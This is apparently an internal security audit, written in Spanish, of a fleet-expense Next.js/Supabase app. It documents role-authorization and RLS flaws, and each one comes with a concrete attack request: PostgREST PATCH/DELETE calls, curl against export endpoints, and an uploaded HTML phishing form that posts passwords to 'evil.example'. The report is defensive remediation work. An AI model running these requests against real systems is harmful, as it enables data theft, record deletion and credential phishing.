# Seguridad — auditoría 11

**Nota: 5/10** (antes 5). Razón del movimiento: **se atacó y subió en un frente,
y la deuda cobró factura en el otro — se cancelan**. Lo que subió es real y hay
que decirlo: `visibilidad.ts` + `tenant-efectivo.ts` **cierran el CRÍTICO nº1 de
la ronda 10** (el chofer que entraba a `/dashboard` y veía la flota entera). Ese
módulo está bien construido: mapa explícito que falla cerrado, `rolEfectivo` que
solo puede restar, la raíz de `/dashboard` bifurca a una pantalla distinta para
quien no ve dinero, y `/dashboard/[id]` —la ruta dinámica que no cabe en el
mapa— comprueba el área a mano. Es el mejor trabajo de autorización que ha
entrado a este repo.

Lo que lo anula: **el rail del asistente cuelga de un endpoint que no mira el
rol**, y ese rail se pinta en las 20 páginas. O sea que el encargado, parado en
la pantalla cuyo comentario dice «NO hay una sola cifra de dinero en esta
pantalla», tiene el monto comprobado y el IVA acreditable de la flota a diez
centímetros a la derecha. Y los dos CRÍTICOS de RLS de la ronda 10 siguen
íntegros en este árbol, porque el PR #7 no está mergeado.

No baja de 5 porque lo que la ronda 10 sostuvo sigue en pie y lo verifiqué otra
vez: **el aislamiento entre flotas no se rompe por ningún lado**, no hay camino
sin autenticar a datos de un tenant, ningún secreto tiene fallback derivado, y
la suplantación de tenant del superadmin está bien acotada (solo `superadmin`,
solo contra un `id` que existe en la tabla, y `?rol=` no puede escalar). Todo lo
que reporto es **dentro** de una flota o entre roles.

El riesgo mayor del rubro hoy: **la autorización por rol se decidió pantalla por
pantalla, y las dos superficies que no son una pantalla —el endpoint del rail y
los dos `route.ts` de export— se quedaron con el contrato viejo de «¿hay
sesión? pasa».**

---

## Hallazgos

### [CRÍTICO] El rail «Asistente de negocio» le sirve las finanzas de la flota al `encargado` y al `operador` — en las 20 páginas y sin teclear nada

`src/app/api/dashboard/asistente/route.ts:25-33` · `src/app/dashboard/chrome.tsx:90` ·
`src/app/dashboard/rail.tsx:58,128,139` · `src/app/dashboard/chat.tsx:23-40` ·
`src/app/dashboard/layout.tsx:19-20`

El handler autentica y no autoriza. Es literalmente todo lo que comprueba:

```ts
const sesion = await getSessionTenant();
if (!sesion) return NextResponse.json({ error: 'sin sesion' }, { status: 401 });
let tenantId = sesion.tenantId;
if (!tenantId) { if (sesion.rol !== 'superadmin') return 403; tenantId = TENANT_DEMO(); }
```

`puedeVerArea(rol, 'dinero')` no aparece. Y el rail que lo consume se monta sin
condición de rol: `chrome.tsx:90` pinta `<RailAsistente />` dentro del marco que
envuelve **las 20 páginas**, y `layout.tsx:19` solo pregunta si hay sesión. El
`fetch` de `rail.tsx:58` sale en cuanto el componente monta.

**Escenario, con valores.** Ana es `encargado` (jefe de tráfico) de Transportes
Innovativos. Entra por `/login`, aterriza en `/dashboard`, y
`resolverTenantEfectivo` hace bien su trabajo: le sirve `InicioOperacion`, «cero
pesos en toda la pantalla». Va a `/dashboard/despacho`, que es su casa. En la
columna derecha, sin haber pedido nada:

- `rail.tsx:128` → **«Tasa de cuadre 87% — 34 de 39 cerraron sin diferencias.»**
- `rail.tsx:119` → **«3 comprobantes en más de un viaje, por $12,480.»**
- el chat de `rail.tsx:139/142` recibe `kpis` y `acred` completos, así que
  teclear «¿cuánto llevo comprobado?» devuelve, desde `chat.tsx:24`,
  **«Llevas $1,847,300 comprobados en 39 viajes»**; «IVA» devuelve
  **«$118,420 de IVA acreditable este periodo»** (`chat.tsx:35`); «peaje»,
  «diésel» y «diferencias», lo mismo.

En pantallas menores a 1280 px el `<aside>` va `hidden` (`rail.tsx:84`) —pero el
`useEffect` corre igual, así que las cifras llegan al navegador de Ana aunque no
se dibujen.

Y el mismo endpoint responde a un rol que ni siquiera tiene panel:

```
curl -b "sb-<ref>-auth-token=…" https://app.likida.ai/api/dashboard/asistente
```
con la sesión de Rubén, `rol='operador'`, devuelve `200` con `kpis`, `acred` y
`anomalias` de toda la flota. `/api` está fuera del matcher del proxy
(`proxy.ts:81`), así que aquí no hay ni primera capa.

**Consecuencia.** El archivo `visibilidad.ts` existe, según su propia cabecera,
porque «enseñarle el margen de la flota [al encargado] no es un detalle de UI,
es exponerle a un puesto medio las finanzas completas de la empresa». Eso es
exactamente lo que pasa hoy, por el camino por defecto, sin que el usuario tenga
que intentar nada. Para el 6-ago: si el contralor pide «enséñame qué ve mi jefe
de tráfico» —que es la demo natural de esta función— la pantalla contesta con el
monto comprobado de la flota.

**Causa raíz probable.** El gate de rol se puso donde `destino` es conocido (la
página), y este endpoint nació *precisamente* porque el layout no conoce
`destino` ni `searchParams`; se copió de `resolverTenantEfectivo` la mitad que
resuelve el tenant y no la que decide el área.

> **Nota de concurrencia, 4-ago 11:35.** Verifiqué esto contra `master` (que es
> lo que Vercel despliega y lo que se demuestra el 6-ago) y sigue abierto ahí.
> Mientras yo auditaba, **otro agente de esta misma ronda dejó en el árbol de
> trabajo un `puedeVerArea(sesion.rol, 'dinero')` sin commitear** en ese handler,
> más `rol_no_mirado.test.ts` (`git status`: ` M src/app/api/dashboard/asistente/route.ts`).
> Lo digo para que nadie lea el archivo de hoy y crea que nunca pasó. Aunque ese
> cambio se commitee, **el hallazgo no queda cerrado del todo**: el rail se sigue
> montando sin condición de rol (`chrome.tsx:90`), así que la autorización de la
> pieza más visible del panel vuelve a descansar en **una sola** capa — el
> handler. Y el resto de este hallazgo (que la única superficie de datos del
> panel fuera del matcher del proxy nació sin gate de rol) es el patrón, no la
> línea.

---

### [CRÍTICO, REINCIDENTE de la ronda 10] La RLS del chofer sigue cubriendo 3 de las 7 tablas: `operador`, `terminal`, `politica_gasto` y `wa_conversacion` le dan lectura **y escritura**

`supabase/migrations/0045_rls_operador.sql:39` · `supabase/migrations/0001_init.sql:110-116` ·
`src/lib/cuadra/conv.ts:60-74`

Verificado en este árbol, hoy: la 0045 reescribe `tenant_data` solo para
`array['viaje', 'gasto', 'liquidacion']` (`:39`). Las otras cuatro del bucle de
`0001:110` conservan la policy `for all` sin `not is_operador()` (`0001:113-116`).
No hay migración posterior que las alcance —la 0047 (`:167-177`) escribe la
versión con `not is_operador()` **solo para las tablas nuevas** `unidad`,
`mantenimiento`, `incidencia` y `pod`, y no toca las viejas.

**Escenario, con valores.** Rubén, `operador` de la flota A, copia su access
token de la cookie `sb-<ref>-auth-token`; la `apikey` es la anon key, pública por
diseño (`src/lib/supabase/server.ts`).

```
PATCH https://<ref>.supabase.co/rest/v1/operador?id=eq.<uuid de otro chofer>
{"telefono":"+5215588887777"}
```
→ `204`. Desde ese instante `resolveOperador` (`conv.ts:60-74`, que resuelve por
`telefono` con `.eq('activo', true)` y nada más) devuelve el `{tenantId,
operadorId}` del compañero para el segundo celular de Rubén: manda fotos de
gasto contra el viaje del otro y recibe su PDF, con su nombre y sus montos.

En una línea, la versión que tumba el demo:
`PATCH /rest/v1/operador?tenant_id=eq.<A>` con `{"activo": false}` deja a toda la
flota sin poder mandar comprobantes por WhatsApp.

**Consecuencia.** Idéntica a la ronda 10 y sin atenuar: teléfono personal y
número de empleado de todos los choferes legibles por cualquier compañero con
cuenta, e identidad de WhatsApp reescribible. Lo anoto REINCIDENTE porque el
arreglo vive en el PR #7 y **este es el árbol que Vercel despliega**.

**Causa raíz probable.** La 0045 razonó tabla por tabla desde «¿esto lo pinta
alguna pantalla del chofer?» en vez de «¿qué le entrega PostgREST a un JWT con
`rol=operador`?».

---

### [ALTO, REINCIDENTE de la ronda 10] Los dos endpoints de export siguen autenticando sin autorizar: `puedeExportar` excluye a `operador` y no se llama en el servidor

`src/app/api/export/liquidaciones/route.ts:17-18` ·
`src/app/api/export/pdf/[id]/route.ts:32-33` · `src/lib/auth/permisos.ts:17,21`

Sin cambio respecto de la ronda 10, líneas de hoy:

```ts
const s = await getSessionTenant();
if (!s || !s.tenantId) return new NextResponse('No autorizado', { status: 401 });
```

`puedeExportar` (`permisos.ts:21`, cuyo conjunto `EXPORTA` de `:17` tiene los
cuatro roles **menos `operador`**) solo decide si se pinta el botón —
`analitica/page.tsx:102`, `[id]/page.tsx:127`. Estas dos rutas están fuera del
matcher del proxy (`proxy.ts:81` excluye `api`), así que esa línea es la única
capa que existe. La lección ya está escrita tres archivos más allá, en el server
action de reasignación (`[id]/page.tsx:70-74`: «Repite la comprobación de
permiso EN el server action: el `puedeAsignar` de arriba solo decide si el
`<form>` se pinta»), y no se trasladó.

**Escenario, con valores.** Rubén, `operador` —el rol al que la ronda 11 le
cerró todas las pantallas de `/dashboard`—, con su sesión viva:

```
curl -b "sb-<ref>-auth-token=…" https://app.likida.ai/api/export/liquidaciones
```
→ `200`, `Content-Disposition: attachment; filename="liquidaciones_likida.csv"`,
hasta **5,000 filas** (`route.ts:26`) de toda la flota: fecha, total comprobado,
total anticipo, diferencia, estatus, folio del viaje y **nombre del operador**
(`route.ts:23`). Con cualquier `id` de esa lista,
`GET /api/export/pdf/<id>` devuelve un 302 a la URL firmada del PDF **del
contralor**, el que lleva los veredictos.

**Consecuencia.** Es el agujero que `visibilidad.ts` cerró en pantalla, abierto
en formato máquina y de un jalón. Y ahora pesa más que en la ronda 10: como el
chofer ya no puede entrar a ninguna página del panel, este CSV es la **única**
superficie por la que sale, y nada en el producto la vigila.

**Causa raíz probable.** La misma de la ronda 10 y sin tocar: al migrar del
passcode a la sesión se sustituyó `tokenMatches(...)` por `getSessionTenant()`
línea por línea, y el passcode no tenía roles que trasladar.

---

### [ALTO] Tres rutas clasificadas como «operación» enseñan pesos de la flota — el `encargado` sí ve finanzas, por el mapa que existe para que no las vea

`src/lib/auth/visibilidad.ts:67,71,74` · `src/app/dashboard/viajes/page.tsx:48,76,118` ·
`src/app/dashboard/analitica/page.tsx:89` · `src/app/dashboard/documentos/page.tsx:124` ·
(contradice) `src/app/dashboard/despacho/page.tsx:36-39`

`AREA_POR_RUTA` pone `/dashboard/viajes`, `/dashboard/analitica` y
`/dashboard/documentos` en `'operacion'`, o sea visibles para el `encargado`
(`visibilidad.ts:41`). Las tres pintan dinero de la flota:

- `viajes/page.tsx:76` → tarjeta **«Anticipo en viajes abiertos»** con la suma
  (`:48`), y `:118` una columna de anticipo por viaje.
- `analitica/page.tsx:89` → **«Gasto por concepto · Todo el histórico de la
  flota»**, barras en MXN, más el conteo de liquidaciones cerradas del periodo.
- `documentos/page.tsx:124` → el monto de cada comprobante.

La contradicción está escrita en el repo. `despacho/page.tsx:36-39` declara, del
mismo rol: *«NO hay una sola cifra de dinero en esta pantalla, y no es un
descuido… El anticipo se captura al crear el viaje porque el motor de cuadre lo
necesita, pero no se lista ni se suma en ninguna columna.»* Un clic a «Viajes»
—el link de al lado en el sidebar, que sí se le pinta— lo lista y lo suma.

**Escenario, con valores.** Ana (`encargado`) abre `/dashboard/viajes` desde su
propio sidebar: ve «Anticipo en viajes abiertos $312,000» y, renglón por
renglón, cuánto adelantó la empresa a cada chofer. En `/dashboard/analitica` ve
en qué se le va el dinero a la flota por concepto, histórico completo.

**Consecuencia.** El entregable de la ronda —«el encargado deja de ver las
finanzas»— es cierto para ocho rutas y falso para tres, y las tres falsas son de
las más visitadas. Para el contralor es peor que no tener la función: cree que
hay una separación que no existe.

**Causa raíz probable.** El área se asignó por el nombre de la sección del
sidebar («Operación») y no por lo que la página renderiza; `viajes`, `analitica`
y `documentos` son pantallas mixtas que nadie partió.

---

### [ALTO, REINCIDENTE de la ronda 10] El `contador` se vende como «solo lectura» y ahora la base le da escritura sobre **diez** tablas, no siete

`src/app/admin/usuarios/nuevo/page.tsx:11` · `src/lib/auth/permisos.ts:4-9` ·
`supabase/migrations/0045_rls_operador.sql:41-45` ·
`supabase/migrations/0047_operacion_encargado.sql:167-185`

La consola sigue ofreciendo `{ valor: 'contador', etiqueta: 'Contador — solo
lectura y exportar' }` (`nuevo/page.tsx:11`). La 0047 —escrita **esta ronda**—
copió el patrón de la 0045 tal cual para las cuatro tablas nuevas:

```sql
create policy tenant_data on public.%I for all
  using ((tenant_id = any(get_user_tenant_ids()) and not is_operador()) or is_superadmin())
  with check (…)
```

`for all`, y la única exclusión es `is_operador()`. O sea: `unidad`,
`mantenimiento`, `incidencia` y `pod` nacen con escritura completa para el
contador, igual que las siete viejas.

**Escenario, con valores.** Marisol, contadora externa de la flota A, con su
sesión legítima del panel:

```
DELETE https://<ref>.supabase.co/rest/v1/liquidacion?id=eq.<uuid>
Authorization: Bearer <su access token>
```
→ `204`. La liquidación desaparece del panel, del CSV y del PDF descargable, sin
`logger`, sin fila de auditoría y sin trigger que lo impida (la 0036/0042 cubren
INSERT y UPDATE de `gasto`, no DELETE de `liquidacion`). Con las tablas nuevas:
`DELETE /rest/v1/pod?tenant_id=eq.<A>` borra la evidencia de entrega de toda la
flota, que es justo lo que `operacion.ts:385-388` dice que no se debe poder
borrar («el archivo NO se borra: borrarlo dejaría la discusión sin prueba»).

**Consecuencia.** Una separación de funciones que la consola promete por escrito
y que ninguna capa de servidor sostiene — lo primero que pide demostrar un
auditor interno. El hallazgo empeoró: la migración nueva reprodujo el patrón en
vez de corregirlo.

**Causa raíz probable.** La 0045 dejó el molde `and not is_operador()` como «la
forma de escribir una policy» y la 0047 lo copió sin volver a preguntar de qué
roles hay que defenderse.

---

### [MEDIO] La suplantación de tenant del superadmin no deja una sola línea: nadie puede decir qué flota se abrió, cuándo ni desde dónde

`src/lib/auth/tenant-efectivo.ts:67-73` · `src/app/api/dashboard/asistente/route.ts:38-41` ·
`src/app/dashboard/[id]/page.tsx:52-58` · `src/app/admin/flotas/page.tsx:84,117`

Los tres sitios que honran `?tenant=` hacen lo correcto en autorización —solo
`superadmin`, y el uuid se valida contra la tabla antes de usarse— y ninguno
escribe nada. `grep "logger\." src/lib/auth/` devuelve tres líneas, todas en
`session.ts`; `tenant-efectivo.ts` ni siquiera importa el logger.

**Escenario, con valores.** Javier abre `https://app.likida.ai/dashboard?tenant=<uuid
de Transportes Innovativos>` desde «Ver dashboard» (`flotas/page.tsx:84`). A
partir de ahí, el sidebar propaga `?tenant=` en cada link (`sidebar-nav.tsx`) y
navega el panel completo del cliente: liquidaciones, montos, diferencias,
nombres de choferes, el CSV y los PDF. En la base y en los logs queda
exactamente lo mismo que si no hubiera entrado. Si mañana el contralor de
Innovativos pregunta «¿quién de ustedes vio mis liquidaciones el martes?», no
hay con qué contestarle.

**Consecuencia.** Para el cliente: acceso de proveedor a sus datos financieros
sin trazabilidad. Es la pregunta que un contralor formal hace en el contrato, no
en la demo — pero la hace. Lo dejo en MEDIO y no en ALTO porque el repo lo
declara: la tarjeta de roadmap de `flotas/page.tsx:117` dice literalmente que
«un audit log de qué flota viste y cuándo» sigue pendiente. Está reconocido, no
escondido.

**Causa raíz probable.** `resolverTenantEfectivo` se escribió como resolución de
un valor (qué `tenantId` usar), no como el ejercicio de un privilegio.

---

### [MEDIO] El bucket `avatares` es público, sin tope de tamaño ni de tipo, y cualquier usuario autenticado —incluido un chofer de cualquier flota— puede escribir en él por la API de Storage

`supabase/migrations/0046_perfil_avatar.sql:17-19` y `:27-30` ·
`src/app/admin/mi-perfil/page.tsx:48-50`

```sql
insert into storage.buckets (id, name, public) values ('avatares','avatares', true)
```
Se inserta con tres columnas: `file_size_limit` y `allowed_mime_types` quedan
`null` = **sin límite y cualquier MIME**. La policy de escritura no mira el rol
ni el tenant, solo la carpeta:

```sql
create policy "avatares_propio_insert" on storage.objects
  for insert to authenticated
  with check (bucket_id = 'avatares' and (storage.foldername(name))[1] = auth.uid()::text);
```

Y la de lectura es `for select to public`.

**Escenario, con valores.** Rubén (`operador`, flota A) no pasa por la app —esa
pantalla es solo de superadmin (`mi-perfil/page.tsx:28`)—; usa la API directa
con su token y la anon key:

```
POST https://<ref>.supabase.co/storage/v1/object/avatares/<su auth.uid>/aviso.html
Authorization: Bearer <su access token>
Content-Type: text/html
<form action="https://evil.example/robar">…Ingresa tu contraseña de Likida…</form>
```
→ `200`. La policy pasa (la carpeta es su propio uid) y el archivo queda servido
**sin sesión** en
`https://<ref>.supabase.co/storage/v1/object/public/avatares/<uid>/aviso.html`,
con el `Content-Type` que él eligió. El mismo `POST` con un archivo de 2 GB
también pasa: no hay `file_size_limit`.

Del lado de la app el flujo es igualmente laxo, aunque solo lo alcanza el
superadmin: `mi-perfil/page.tsx:48` toma la extensión de
`archivo.name.split('.').pop()` y `:50` el `contentType` de `archivo.type`, los
dos del cliente. El `accept="image/*"` de `avatar-uploader.tsx:57` es del
navegador. Lo único que acota el tamaño ahí es el límite por defecto de Server
Actions de Next (1 MB), que no está declarado en `next.config.ts` — es un default
del framework, no una decisión de este repo.

**Consecuencia.** Alojamiento de contenido arbitrario, servido sin autenticar,
bajo el dominio de Supabase del proyecto — el sitio ideal para un phishing
dirigido a los propios operadores de las flotas («entra a este link de Likida»).
Y egress y almacenamiento sin techo, facturables al proyecto, disparables por
cualquiera de las cuentas que la flota dé de alta.

**Causa raíz probable.** La migración razonó la sensibilidad del contenido
esperado («una foto de perfil no trae RFC») y no la de lo que la policy admite,
que es cualquier archivo.

---

### [MEDIO, REINCIDENTE de la ronda 10] El botón de Google sigue sin el equivalente de `shouldCreateUser:false`

`src/app/login/page.tsx:60-62` · `src/app/login/no_autoregistro.test.ts`

Sin cambio en este árbol. El camino de correo cierra el autoregistro en código
(`:87`, con prueba que lo ancla); `signInWithOAuth` (`:60-62`) no tiene la bandera y
nadie la sustituye. Lo único que impide que un consentimiento de Google cree un
`auth.users` es el interruptor «Allow new users to sign up» del proyecto — y que
el otro camino se moleste en apagarlo explícitamente dice que está encendido.

**Escenario, con valores.** Cualquiera con cuenta de Google pulsa «Continuar con
Google» en `app.likida.ai/login`: obtiene un `auth.users` real y un JWT con
`role=authenticated` firmado por el secreto del proyecto. En la app no ve nada
(`requireSessionTenant` lo manda a `/sin-acceso`), pero el JWT sirve contra
PostgREST con `get_user_tenant_ids()` vacío. Recorrí las policies otra vez con
las cuatro tablas nuevas de la 0047 incluidas y **todas deniegan** con arreglo
vacío. El hallazgo es que la puerta dejó de estar cerrada por código.

**Consecuencia.** Registro ilimitado de cuentas (MAU facturable) y una superficie
de JWT válidos que el diseño supone imposible. Colateral para el 6-ago: si el
provider **no** está configurado, ese botón —el primero de la pantalla de
login— devuelve «Algo falló. Intenta otra vez.» delante del contralor.

---

### [MEDIO, REINCIDENTE de la ronda 10, agravado] El alta de «Chofer (operador)» produce una cuenta que ya no puede entrar a **nada**

`src/lib/auth/provisionar.ts:27-32` · `src/app/admin/usuarios/nuevo/page.tsx:12` ·
`src/lib/auth/guard.ts:52` · `src/lib/auth/tenant-efectivo.ts:55` ·
`src/lib/auth/visibilidad.ts:36-45`

`provisionarUsuario` sigue insertando `{id, tenant_id, email, nombre, rol}` **sin
`operador_id`** (`:28-31`), y la consola sigue ofreciendo la opción «Chofer
(operador) — solo sus propios viajes» (`nuevo/page.tsx:12`). La ronda 10
reportaba que ese usuario acababa en `/dashboard` viéndolo todo. Este árbol
cerró esa salida —`operador` no está en `AREAS_POR_ROL`, así que
`resolverTenantEfectivo:55` lo rebota— y con eso el rol quedó **sin ninguna
puerta**.

**Escenario, con valores.** Javier da de alta a Rubén desde
`/admin/usuarios/nuevo` con rol «Chofer». Rubén pide su magic link y entra.
`login/page.tsx:50` lo manda a `/dashboard`; ahí `resolverTenantEfectivo:55` lo
rebota a `inicioDe('operador')` = `/sin-acceso` (`visibilidad.ts:138`, porque no
tiene áreas). Va a `/mis-viajes`: `requireOperador` exige `operadorId`, que la
consola no llenó, y lo manda otra vez a `/sin-acceso` (`guard.ts:52`). Fin.
Un rol que la consola ofrece produce una cuenta que solo ve la pantalla de «no
tienes acceso», y la única superficie que sí le responde es
`GET /api/export/liquidaciones` (hallazgo de arriba).

**Consecuencia.** Si el demo del 6-ago incluye dar de alta a un chofer —que es la
demostración obvia de «cada quien ve lo suyo»— la pantalla que sale es
`/sin-acceso`. Y el trabajo completo de la 0045, `/mis-viajes` y el bloque 26 de
`verificaciones.sql` queda inalcanzable por la única vía de alta que existe.

**Causa raíz probable.** El alta y la liga con la fila de `operador` son dos
pasos y solo se implementó el primero; la ronda 11 cerró la fuga sin notar que
el rol quedaba huérfano.

---

### [BAJO] `try_lock_viaje` y `unlock_viaje`: el `revoke … from public` no alcanza el grant explícito de Supabase — y el repo ya lo sabía, dos migraciones después

`supabase/migrations/0012_seguridad_rls.sql:13-14` · (contra)
`supabase/migrations/0013_guardar_liquidacion_tx.sql:52-55` ·
`supabase/migrations/0031_intake_barrera_ttl.sql:83` ·
`supabase/verificaciones.sql:613-614,625-626`

La 0012 revoca de `public` y concede a `service_role`:

```sql
revoke execute on function try_lock_viaje(uuid, integer) from public;
revoke execute on function unlock_viaje(uuid) from public;
```

y explica el porqué al revés: *«las funciones se otorgan a PUBLIC por defecto (revocar
solo de anon NO basta)»* (`0012:11-12`), y `verificaciones.sql:614` lo remata al
revés todavía: *«`revoke … from anon` NO basta y por eso se revoca de PUBLIC»*.
En Supabase no es herencia: el `alter default privileges` del proyecto otorga
`execute` **explícitamente** a `anon` y `authenticated`, y un `revoke from
public` no lo toca. La propia 0013 lo escribe correcto trece líneas de código
después (`:52`: «EXPLÍCITA por default privileges, así que `revoke from public`
NO basta») y revoca de `public, anon, authenticated`; la 0031 corrigió así
`intake_delta` (`:83`). Las dos del mutex **nunca** se corrigieron: `0035` solo
les puso `search_path` (no toca grants) y `0005` las crea con `create or replace`
(preserva grants).

**Escenario, con valores, y lo que lo cierra.**
```
POST https://<ref>.supabase.co/rest/v1/rpc/unlock_viaje
apikey: <anon key, pública>
{"p_viaje":"<uuid del viaje que se está liquidando>"}
```
El grant de EXECUTE está: PostgREST no responde «función no encontrada». Pero
**intenté explotarlo y no cierra**: ninguna de las dos es `security definer`
(`0005:31-49`), así que el cuerpo corre como `anon`, y `viaje_lock` tiene RLS
encendida sin una sola policy (`0005:26`). El `delete` afecta 0 filas y el
`insert … on conflict` de `try_lock_viaje` sale con `42501`. La segunda capa
sostiene.

**Consecuencia.** Hoy, ninguna práctica: es defensa en profundidad perdida. Lo
que reporto es que **el repo cree que esta puerta está cerrada y no lo está**,
lo dejó escrito dos veces, y su propio verificador lo delataría: el bloque 16 de
`verificaciones.sql:631` imprime `anon-lock` / `anon-unlock` con «esperado f» y
contra la base real saldría `t`. Ese bloque es un `raise exception` que hay que
correr a mano y nadie corre. BAJO, no MEDIO, solo por la RLS de `viaje_lock`.

---

### [BAJO] `/dashboard/mapa` y `/dashboard/soporte` no llaman a ninguna guarda: su única capa de autorización es el matcher del proxy

`src/app/dashboard/mapa/page.tsx:6` · `src/app/dashboard/soporte/page.tsx:6` ·
`src/lib/auth/guard.ts:78-83` · `src/proxy.ts:44,81`

Son las dos únicas páginas de `/dashboard` sin `resolverTenantEfectivo` ni
`exigirVerRuta` ni `requireSessionTenant` — lo verifiqué contra las 20
(`grep -rn "resolverTenantEfectivo\|requireSessionTenant\|exigirVerRuta"
src/app/dashboard/`). `exigirVerRuta` existe exactamente para esto y su
docstring lo dice: *«un stub también filtra: "Cobranza" y "Rentabilidad", aunque
estén vacías, le anuncian a un jefe de tráfico qué mira su patrón»*. Sus
hermanas `cobranza`, `clientes`, `rentabilidad` y `cotizador` sí la llaman.

**Escenario, con valores.** Marisol (`contador`, áreas = `['dinero']`) teclea
`app.likida.ai/dashboard/mapa`: pasa. Las dos son de área `'operacion'`
(`visibilidad.ts:72,76`), o sea que no le tocan, y `puedeVerRuta` las negaría —
pero nadie la llama. Lo que ve es un stub declarado, sin datos, así que la fuga
real es el inventario de qué funciones tiene el producto.

**Consecuencia.** Baja por sí misma; la anoto porque son el único punto de
`/dashboard` donde el número de capas es **una**, y el enunciado del rubro es que
un matcher no cuenta como capa independiente. Verifiqué que el bypass de
middleware de Next (CVE-2025-29927, `x-middleware-subrequest`) **no** aplica:
`next@16.2.11`, muy por encima de 15.2.3.

---

### [BAJO] Escrituras que cruzan tenant: `crearIncidencia` y `marcarPodPedido` no comprueban que el viaje sea del tenant, y las FK son de una sola columna

`src/lib/cuadra/operacion.ts:375-382` y `:535-546` ·
`supabase/migrations/0047_operacion_encargado.sql:100,130` ·
`src/app/dashboard/incidencias/page.tsx:70-76`

Las dos insertan con `supabaseAdmin()` (service-role, salta RLS) poniendo
`tenant_id` de la sesión y `viaje_id` **tal como llegó del formulario**, sin
comprobar que ese viaje pertenezca al tenant. La FK del esquema es
`viaje_id uuid references public.viaje(id)` — una sola columna, así que la base
tampoco lo impide.

**Escenario, con valores.** Ana, `encargado` de la flota A, arma el POST del
formulario de `/dashboard/incidencias` a mano con
`viajeId=<uuid de un viaje de la flota B>`: se inserta
`{tenant_id: A, viaje_id: <de B>, tipo: 'daño'}`. La fila queda en A; `getIncidencias`
solo cruza viajes de A, así que en pantalla sale sin folio. No leo nada de B con
esto, así que **no es una fuga entre flotas** — lo intenté por los dos lados.
Lo que sí queda es una fila de A colgando de un registro de B con `on delete
cascade` (`0047:100`): el día que B borre ese viaje, la incidencia de A
desaparece sin que nada lo explique.

**Consecuencia.** Integridad, no confidencialidad. Lo reporto en mi rubro porque
el patrón —«el service-role pone el `tenant_id` y confía en el resto del
formulario»— es el que en `viaje`/`gasto` sí sería fuga; aquí solo no lo es por
qué columnas se leen de vuelta. El resto del modelo lo lleva el auditor de datos.

---

### [BAJO, REINCIDENTE de las rondas 8, 9 y 10] `GET /api/demo` publica el inventario de configuración sin autenticar

`src/app/api/demo/route.ts:7-10`

```ts
export async function GET() { return NextResponse.json({ ok: true, config: envHealth() }); }
```
Sin sesión, sin rate-limit, sin cap de cuerpo, y fuera del matcher (`proxy.ts:81`).
`envHealth()` (`src/lib/env.ts`) devuelve `{llm, whatsapp, supabase}`: nombres no,
mapa de qué integraciones están puestas sí. Cuarta ronda idéntica.
`curl https://app.likida.ai/api/demo` → `{"ok":true,"config":{...}}`.

---

### [BAJO, REINCIDENTE de la ronda 10] `/acceso` sigue publicado con el passcode viejo y ya no autoriza nada

`src/app/acceso/page.tsx:9-35` · `src/lib/auth/passcode.ts:70-90`

Reverificado hoy: `tokenMatches` **no tiene un solo consumidor** fuera de
`passcode.ts` y su prueba (`grep -rn "tokenMatches" src/` → solo
`passcode.test.ts`). La cookie `likida_access` que esa página emite no abre
ninguna puerta. Quien teclee `app.likida.ai/acceso` el 6-ago ve una segunda
pantalla de login, con otro branding, que acepta un código y después lo devuelve
a `/login` por el proxy. `DASHBOARD_PASSCODE` sigue vivo en el entorno sin
proteger nada.

---

## Lo que revisé y está bien

**El CRÍTICO nº1 de la ronda 10 está CERRADO en este árbol, y es el mejor
trabajo del rubro.** `visibilidad.ts` + `tenant-efectivo.ts` sacan al `operador`
de `/dashboard` por diseño: no está en `AREAS_POR_ROL` (`visibilidad.ts:36-45`),
`areasDe` devuelve `[]` por el `??` (`:48`), y `resolverTenantEfectivo:55` rebota
antes de resolver el tenant. Recorrí las 20 páginas: 15 pasan por
`resolverTenantEfectivo`, 4 por `exigirVerRuta`, y `/dashboard/[id]` —la
dinámica, que no puede estar en el mapa— comprueba el área **a mano**
(`[id]/page.tsx:41`), que es justo donde se rompen estas cosas. La raíz bifurca a
`InicioOperacion` en vez de esconder secciones (`page.tsx:307-308`), con el
criterio escrito como «¿ve dinero?» y no «¿es encargado?». Solo dos páginas se
quedaron fuera (hallazgo BAJO de arriba).

**`?rol=` no es escalada, verificado extremo a extremo.** `rolEfectivo`
(`visibilidad.ts:129-133`) honra el parámetro **solo** si el rol real es
`superadmin`, y solo contra el conjunto `PREVISUALIZABLES` (`:111`) que no
incluye `superadmin` ni `operador`: el resultado es siempre un subconjunto de lo
que esa sesión ya podía ver. Un `encargado` con `?rol=flota_admin` en la barra
sigue siendo `encargado`. `visibilidad.test.ts:81-107` lo ancla con seis casos,
incluido el basura y el `null`. Además se anuncia en pantalla
(`aviso-rol.tsx:29`), que era la otra forma de que esto se volviera un bug.

**El `?tenant=` está bien acotado en los tres sitios que lo aceptan.** Solo
`rol === 'superadmin'` (`tenant-efectivo.ts:67`, `[id]/page.tsx:52`,
`asistente/route.ts:38`), y el uuid se valida contra `tenant` antes de usarse —
un `?tenant=<uuid inventado>` cae al `if (t)` y se queda con el tenant de la
sesión. Un `flota_admin` con `?tenant=<otra flota>` no mueve nada: lo seguí por
los tres caminos. **El aislamiento entre flotas se sostiene**, y ese sigue siendo
el motivo por el que esta nota no baja de 5.

**`/admin` está detrás de autorización real, no de un matcher — reconfirmado
sobre este árbol.** `requireSuperadmin()` en `admin/layout.tsx:36` envuelve toda
página descendiente (el `redirect()` aborta antes de que el RSC del hijo se
serialice), **no existe ningún `route.ts` bajo `src/app/admin/`**
(`find src/app -name route.ts` → los cinco que hay están bajo `api/` y
`auth/callback`), que es la forma en que un layout no protege a su hermana, y
los tres server actions repiten la comprobación adentro:
`usuarios/nuevo/page.tsx:28` y `mi-perfil/page.tsx:35,44`. `admin/page.tsx:79` la
llama otra vez en su `Promise.all`. Sigue siendo **una sola** capa de rol (el
proxy solo pregunta «¿hay sesión?», `proxy.ts:44`), pero es una capa de verdad.

**Secretos: ninguno con fallback derivado, tercera ronda igual.**
`passcode.ts:85-89` lanza en producción en vez de caer a `likida:${passcode}`;
`supabaseAdmin()` lanza sin `SUPABASE_SERVICE_ROLE_KEY`
(`src/lib/supabase/admin.ts:13`); `verifySignature` devuelve `false` sin
`WHATSAPP_APP_SECRET` (`meta/client.ts:42`, fail-closed) y compara con
`timingSafeEqual` tras igualar
longitudes (`:46`). `env.ts` devuelve **nombres, nunca valores**. El único valor
con default literal es `DEMO_TENANT_ID` (`guard.ts:25`) y no es un secreto.

**La URL firmada del PDF sigue en 60 segundos, no en 3600.**
`export/pdf/[id]/route.ts:58` firma con `60` y `{download: …}`. El TTL cubre la
vida del 302 y nada más. Los dos 404 son indistinguibles a propósito (`:52-54`).

